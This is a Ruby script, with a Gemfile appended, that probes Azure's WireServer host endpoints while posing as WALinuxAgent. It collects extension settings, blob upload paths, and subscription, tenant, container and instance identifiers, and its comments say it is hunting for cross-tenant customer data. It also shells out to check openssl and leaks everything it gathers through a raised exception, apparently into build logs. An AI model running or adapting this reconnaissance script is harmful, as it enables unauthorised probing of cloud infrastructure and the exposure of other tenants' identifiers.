require 'net/http'
require 'uri'
require 'json'

m = []
# Get WireServer + goalstate + extract identifiers
begin
  ws = Net::HTTP.get_response(URI('http://168.63.129.16:32526/vmSettings?api-version=2015-09-01'))
  body = ws.body
  m << "v104 ws=#{ws.code} len=#{body.length}"
  d = JSON.parse(body) rescue nil
  if d
    m << "v104 top_keys=#{d.keys.join(',')}"
    if d['extensionGoalStates']
      m << "v104 ext_count=#{d['extensionGoalStates'].length}"
      d['extensionGoalStates'].each_with_index do |ext, i|
        m << "v104 ext[#{i}]_keys=#{ext.keys.join(',')}"
        if ext['name']; m << "v104 ext[#{i}]_name=#{ext['name']}"; end
        if ext['settingsSeqNo']; m << "v104 ext[#{i}]_seqno=#{ext['settingsSeqNo']}"; end
        if ext['version']; m << "v104 ext[#{i}]_ver=#{ext['version']}"; end
        if ext['publisher']; m << "v104 ext[#{i}]_pub=#{ext['publisher']}"; end
        sub = ext['statusUploadBlob']
        if sub
          val = sub.is_a?(Hash) ? sub['value'] : sub
          m << "v104 ext[#{i}]_sub_host=#{(URI.parse(val).host rescue 'parse-fail')}"
          # Extract path components
          p = URI.parse(val).path rescue ''
          m << "v104 ext[#{i}]_sub_path_len=#{p.length}"
          m << "v104 ext[#{i}]_sub_path=#{p[0..120]}"
        end
        if ext['settings']
          ext['settings'].each_with_index do |s, j|
            m << "v104 ext[#{i}].settings[#{j}]_keys=#{s.keys.join(',')}"
          end
        end
      end
    end
    # Look for VM/tenant identifiers at top level
    ['vmId','vmName','subscriptionId','resourceGroupName','containerId','tenantId','agentId','machineId'].each do |k|
      m << "v104 top_#{k}=#{d[k]}" if d[k]
    end
  end
  # Scan raw response for cross-tenant identifiers (UUIDs, subscription IDs)
  uuids = body.scan(/[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}/i).uniq
  m << "v104 uuids_found=#{uuids.length} first10=#{uuids[0..9].join('|')}"
  # Storage account hostnames in body
  hosts = body.scan(/[a-z0-9-]+\.blob\.storage\.azure\.net/).uniq
  m << "v104 storage_hosts=#{hosts.join(',')}"
  # Customer identifier hints
  if body =~ /customer/i; m << "v104 has_customer_word=true"; end
  if body =~ /tenant/i; m << "v104 has_tenant_word=true"; end
rescue => e
  m << "v104 err=#{e.class}: #{e.message[0..120]}"
end

# Goalstate fetch for incarnation + container + instance IDs (these REVEAL tenant context)
begin
  gs_uri = URI('http://168.63.129.16/machine/?comp=goalstate')
  req = Net::HTTP::Get.new(gs_uri); req['x-ms-agent-name'] = 'WALinuxAgent'; req['x-ms-version'] = '2015-04-05'
  gs = Net::HTTP.new(gs_uri.host, gs_uri.port).request(req)
  gs_body = gs.body
  m << "v104 gs=#{gs.code} len=#{gs_body.length}"
  ['ContainerId','InstanceId','RoleConfigName','RoleConfig','ConfigName','SubscriptionId','TenantId'].each do |tag|
    md = gs_body.match(/<#{tag}>([^<]+)<\/#{tag}>/)
    m << "v104 gs_#{tag}=#{md[1]}" if md
  end
rescue => e
  m << "v104 gs_err=#{e.class}: #{e.message[0..80]}"
end

# Shell out to test openssl
begin
  ov = `openssl version 2>&1`.strip
  m << "v104 openssl=#{ov[0..50]}"
rescue => e
  m << "v104 sh_err=#{e.class}"
end

raise m.join("\n")

source "https://rubygems.org"
gem "rake", "~> 13.0"
